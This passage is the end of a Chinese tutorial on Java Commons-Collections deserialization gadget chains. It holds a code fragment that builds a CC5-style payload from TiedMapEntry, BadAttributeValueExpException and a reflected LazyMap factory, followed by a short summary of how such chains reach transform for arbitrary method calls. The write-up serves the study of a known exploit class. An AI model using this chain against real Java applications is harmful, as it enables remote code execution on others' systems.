        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "qq");
        lazyMap.remove("qq");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class b = badAttributeValueExpException.getClass();
        Field bfield =  b.getDeclaredField("val");
        bfield.setAccessible(true);
        bfield.set(badAttributeValueExpException,tiedMapEntry);

        Class c = LazyMap.class;
        Field factoryfield = c.getDeclaredField("factory");
        factoryfield.setAccessible(true);
        factoryfield.set(lazyMap,chainedTransformer);

//        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
```

‍

总结
==

其实CC的精髓，就是去找谁的`readObject`​可以传任意调用对象，并且可以走到 `transform`​里头来进行动态类加载或者任意方法调用

最后附上CC的结构图 我个人觉得还是画得比较清晰的

![image](images/attach-1a6694b9cf6a1c3b03c977097fc49acecb35e959.png)​
